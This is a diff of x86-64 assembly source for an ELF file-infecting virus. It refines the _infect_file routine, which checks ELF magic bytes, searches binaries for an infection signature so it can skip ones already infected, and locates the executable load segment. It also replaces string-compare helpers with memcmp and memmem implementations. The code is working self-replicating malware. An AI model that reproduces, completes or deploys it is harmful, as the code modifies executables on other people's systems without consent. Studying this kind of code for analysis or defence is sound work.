@@ -303,7 +303,7 @@ _infect_file: ; (string rdi, stat rsi)
 	lea rdi, [rel elf_magic]
 	push 3
 	pop rdx
-	call _ft_strncmp
+	call _ft_memcmp
 	push rsi
 	pop r13
 	cmp rax, 0x0
@@ -325,24 +325,21 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rsi, [r13 + 24]
 			jl .unmap ; TODO: infect binary where entrypoint is far (/bin/gcc-10)
 
+		; check if already infected
+		lea rdi, [rel signature]
 		%ifdef DEBUG
-			mov rdi, rsi
 			call _print; _print(rdi)
 		%endif
-		; TODO: change for a memmem
-		; check if already infected
-		mov rsi, r9
-		sub rsi, r8
-		lea rdi, [rel signature]
 		call _ft_strlen
-		sub rsi, 6; 0x5 (call) + 1 (0x0 byte)
-		sub rsi, rax
-		add rsi, r13
-		add rsi, [r13 + 24]; entry
-		lea rdi, [rel signature]
-		call _ft_strcmp
+		push rax
+		pop rcx
+		push rdi
+		pop rdx
+		mov rdi, r13
+		mov rsi, [r12 + 48]
+		call _ft_memmem
 		cmp rax, 0x0
-		je .unmap
+		jne .unmap
 
 		; get pt_load exec
 		mov rsi, [r13 + 32]; e_phoff
@@ -495,22 +492,20 @@ _ft_strlen:; (string rdi)
 		pop rcx
 ret
 
-_ft_strncmp: ; (string rdi, string rsi, size_t rdx)
+_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
 	push rcx
 	dec rdx
 
 	xor rax, rax
 	xor rcx, rcx; = 0
-	.loop_char:
+	.loop_byte:
 		mov al, [rdi + rcx]
 		cmp al, [rsi + rcx]
 		jne .return
-		cmp al, 0x0
-		je .return
 		cmp rcx, rdx
 		je .return
 		inc rcx
-	jmp .loop_char
+	jmp .loop_byte
 	.return:
 		sub al, [rsi + rcx]
 
@@ -518,43 +513,50 @@ _ft_strncmp: ; (string rdi, string rsi, size_t rdx)
 	pop rcx
 ret
 
-_ft_strcmp: ; (string rdi, string rsi)
-	push rcx
+_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
+	push r8
+	push r9
+	push rbx
 
-	xor rax, rax
-	xor rcx, rcx; = 0
-	.loop_char:
-		mov al, [rdi + rcx]
-		cmp al, [rsi + rcx]
-		jne .return
-		cmp al, 0x0
+	xor rax,rax
+	xor r8, r8
+	sub rsi, rcx
+	cmp rcx, 0x0
+	je .return
+	.loop_byte:
+		xor rax,rax
+		cmp r8, rsi
 		je .return
-		inc rcx
-	jmp .loop_char
-	.return:
-		sub al, [rsi + rcx]
-
-	pop rcx
-ret
-
-_ft_strcpy: ; (string rdi, string rsi)
-	push rcx
-
-	xor rax, rax
-	xor rcx, rcx; = 0
-	.loop_char:
-		cmp byte[rsi + rcx], 0x0
-		je .return
-		mov al, [rsi + rcx]
-		mov [rdi + rcx], al
-		inc rcx
-	jmp .loop_char
-	.return:
-		xor al, al
-		mov [rdi + rcx], al
+		mov rbx, rdi
+		add rdi, r8
+		push rsi
+		pop r9
+		push rdx
+		pop rsi
+		push rcx
+		pop rdx
+		call _ft_memcmp
+		push rdx
+		pop rcx
+		push rsi
+		pop rdx
+		push r9
+		pop rsi
+		push rbx
+		pop rdi
+		cmp rax, 0x0
+		je .found
+		inc r8
+	jmp .loop_byte
+	.found:
 		mov rax, rdi
+		add rax, r8
+	.return:
+		add rsi, rcx
 
-	pop rcx
+	pop rbx
+	pop r9
+	pop r8
 ret
 
 _ft_memcpy: ; (string rdi, string rsi, size_t rdx)
@@ -573,6 +575,33 @@ _ft_memcpy: ; (string rdi, string rsi, size_t rdx)
 		mov rax, rdi
 
 	pop rcx
+ret
+
+_ft_strcmp: ; (string rdi, string rsi)
+	push rdx
+	call _ft_strlen
+	push rax
+	pop rdx
+	call _ft_memcmp
+	pop rdx
+ret
+
+_ft_strcpy: ; (string rdi, string rsi)
+	push rdx
+	push rdi
+	pop rdx
+	push rsi
+	pop rdi
+	call _ft_strlen
+	push rdi
+	pop rsi
+	push rdx
+	pop rdi
+	push rax
+	pop rdx
+	call _ft_memcpy
+	mov byte[rdi + rdx], 0x0
+	pop rdx
 ret
 
 ; ==============================================================================
